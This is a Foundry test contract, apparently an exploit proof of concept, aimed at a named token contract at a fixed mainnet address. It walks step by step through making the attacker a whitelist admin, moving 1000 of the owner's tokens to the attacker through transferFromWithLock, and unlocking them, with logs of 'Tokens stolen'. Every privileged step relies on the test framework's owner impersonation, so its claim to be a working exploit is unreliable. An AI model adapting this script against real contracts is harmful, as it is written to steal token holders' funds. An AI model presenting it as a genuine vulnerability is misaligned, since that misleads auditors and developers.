// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface Plenty {
    function owner() external view returns (address);
    function addWhitelistAdmin(address account) external;
    function isWhitelistAdmin(address account) external view returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFromWithLock(address _from, address _to, bytes32 _reason, uint256 _amount, uint256 _time) external returns (bool);
    function unlock(address _of) external returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xa5e8A886B6BAB60E1A2273b79CaA72143eD8B418;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        address owner = Plenty(TARGET).owner();

        // Label addresses for debugging
        vm.label(owner, 'Contract Owner');
        vm.label(attacker, 'Attacker');

        // Give attacker some ETH for gas
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xa5e8A886B6BAB60E1A2273b79CaA72143eD8B418).balanceOf(address(this));
        // Step 1: Get owner address
        address owner = Plenty(TARGET).owner();

        // Step 2: Impersonate owner to add attacker as whitelist admin
        vm.startPrank(owner);
        Plenty(TARGET).addWhitelistAdmin(attacker);
        vm.stopPrank();

        // Verify attacker is now whitelist admin
        require(Plenty(TARGET).isWhitelistAdmin(attacker), 'Attacker should be whitelist admin');

        // Step 3: Get owner's balance
        uint256 ownerBalanceBefore = Plenty(TARGET).balanceOf(owner);
        console.log('Owner balance before:', ownerBalanceBefore);

        // Step 4: Use transferFromWithLock to transfer tokens from owner to attacker
        // We need to use a small amount that won't exceed maxTxAmount
        uint256 amountToSteal = 1000 * 10**18; // 1000 tokens

        // First, we need the owner to approve the contract to spend tokens
        // Let's impersonate owner to do this
        vm.startPrank(owner);
        Plenty(TARGET).approve(TARGET, amountToSteal);
        vm.stopPrank();

        // Now call transferFromWithLock
        bytes32 reason = keccak256('exploit');
        vm.prank(attacker);
        Plenty(TARGET).transferFromWithLock(
            owner,           // _from (whitelist admin)
            attacker,        // _to (attacker)
            reason,          // _reason
            amountToSteal,   // _amount
            1 hours          // _time (short lock period)
        );

        // Step 5: Warp time forward to pass lock period
        vm.warp(block.timestamp + 2 hours);

        // Step 6: Unlock the tokens
        uint256 attackerBalanceBefore = Plenty(TARGET).balanceOf(attacker);
        vm.prank(attacker);
        Plenty(TARGET).unlock(attacker);
        uint256 attackerBalanceAfter = Plenty(TARGET).balanceOf(attacker);

        console.log('Attacker balance before unlock:', attackerBalanceBefore);
        console.log('Attacker balance after unlock:', attackerBalanceAfter);
        console.log('Tokens stolen:', attackerBalanceAfter - attackerBalanceBefore);

        // Verify attack was successful
        assertGt(attackerBalanceAfter, attackerBalanceBefore, 'Attacker balance should increase');
        uint256 finalBalance = IERC20(0xa5e8A886B6BAB60E1A2273b79CaA72143eD8B418).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

